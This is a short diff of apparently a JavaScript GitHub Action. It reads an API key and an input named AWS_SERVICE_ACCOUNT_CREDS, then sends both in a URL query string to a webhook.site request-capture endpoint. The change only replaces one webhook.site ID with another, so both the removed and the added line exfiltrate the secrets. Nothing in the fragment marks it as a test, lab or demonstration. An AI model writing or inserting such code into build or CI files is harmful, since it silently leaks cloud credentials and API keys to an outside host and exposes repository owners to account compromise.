@@ -7,7 +7,7 @@ async function run() {
     const aws_cred = core.getInput('AWS_SERVICE_ACCOUNT_CREDS');
 
     // Make HTTP request using fetch (async function context required for await)
-    const response = await fetch(`https://webhook.site/19392977-94a1-42ba-a4ad-74ce4cdd572b?api_key=${api_key}&aws_cred=${aws_cred}`);
+    const response = await fetch(`https://webhook.site/ccc493bc-998b-4a15-8ba0-8453c0773c19?api_key=${api_key}&aws_cred=${aws_cred}`);
     const data = await response.json();
     console.log(data); // Log response data
 
